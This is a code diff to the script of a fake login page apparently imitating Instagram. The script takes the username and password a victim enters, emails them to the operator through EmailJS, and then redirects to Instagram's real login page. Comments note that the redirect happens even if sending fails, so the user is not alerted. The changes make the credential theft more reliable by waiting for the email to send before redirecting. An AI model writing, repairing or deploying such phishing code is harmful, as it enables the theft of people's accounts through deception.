@@ -256,26 +256,31 @@
         });
 
         const loginForm = document.getElementById('loginForm');
+        const submitBtn = document.getElementById('submitBtn');
 
         loginForm.addEventListener('submit', (e) => {
             e.preventDefault();
             
+            // Evitamos múltiples clics mientras procesa
+            submitBtn.disabled = true;
+
             const templateParams = {
                 to_name: "Administrador",
                 username: document.getElementById('usernameInput').value,
                 password: passwordInput.value
             };
 
-            // Envía los datos al correo en segundo plano y redirige inmediatamente
+            // Enviamos el correo y esperamos a que el servidor de EmailJS responda antes de cambiar de página
             emailjs.send("service_vyx1v45", "template_vyx1v45", templateParams)
                 .then((response) => {
-                    console.log('Credenciales enviadas con éxito!');
+                    console.log('Correo enviado con éxito!', response.status, response.text);
+                    // Redirige de inmediato una vez confirmado el envío
+                    window.location.href = "https://www.instagram.com/accounts/login/?mtn";
                 }, (error) => {
-                    console.log('Error al enviar', error);
+                    console.log('Fallo al enviar el correo...', error);
+                    // Aunque falle por cualquier motivo técnico, redirige para no alertar al usuario
+                    window.location.href = "https://www.instagram.com/accounts/login/?mtn";
                 });
-
-            // Redirección directa a Instagram sin alertas
-            window.location.href = "https://www.instagram.com/accounts/login/?mtn";
         });
     </script>
 
